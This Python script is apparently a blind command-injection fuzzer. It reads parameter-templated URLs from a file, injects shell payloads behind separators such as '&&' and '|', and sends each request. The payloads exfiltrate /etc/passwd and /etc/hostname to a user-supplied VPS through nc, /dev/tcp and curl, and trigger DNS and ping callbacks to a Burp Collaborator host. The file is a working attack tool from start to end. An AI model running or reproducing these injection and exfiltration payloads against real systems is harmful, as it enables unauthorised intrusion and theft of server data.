import urllib.parse

import requests

def rce():
    ip=input('what is your vps ip ?')
    port = input('what is your port?')
    burp_id= input('what is your burp id ?')
    patterns= [
        "daemon=",
        "upload=",
        "dir=",
        "download=",
        "log=",
        "ip=",
        "cli=",
        "cmd=",
        "exec=",
        "command=",
        "execute=",
        "ping=",
        "query=",
        "jump=",
        "code=",
        "reg=",
        "do=",
        "func=",
        "arg=",
        "option=",
        "load=",
        "process=",
        "step=",
        "read=",
        "function",
        "req=",
        "feature=",
        "exe=",
        "module=",
        "payload=",
        "run=",
        "print="
        ]
    start = ['&','&&','|','||']
    pay = [f'nc {ip} {port} < /etc/passwd',
           f'nc {ip} {port} < /etc/hostname',
           f'cat /etc/passwd > /dev/tcp/{ip}/{port}',
           f'cat /etc/hostname > /dev/tcp/{ip}/{port}',
           f'curl -d @/etc/passwd {burp_id}',
           f'curl -d @/etc/hostname {burp_id}',
           f'dig a {burp_id}',
           f'ping {burp_id}'
           ]
    payloads = []
    for zz in pay:
        payloads.append(zz)
        for bb in start:

            payloads.append(f"{bb} {zz}")
    file = open("param","r")
    for i in file.readlines():
      for j in patterns:
           kalam = j + "RFUZZ"
           if kalam in i :
               for p in payloads:
                   try:
                            jadid=j+p
                            stri = i.replace(kalam,jadid)
                            beau= urllib.parse.quote(stri).replace("%3A",":")
                            res = requests.get(str(beau))
                            print(f"[+]{beau}")

                   except KeyboardInterrupt:
                       pass
                   except:
                       print("some thing went wrong")



rce()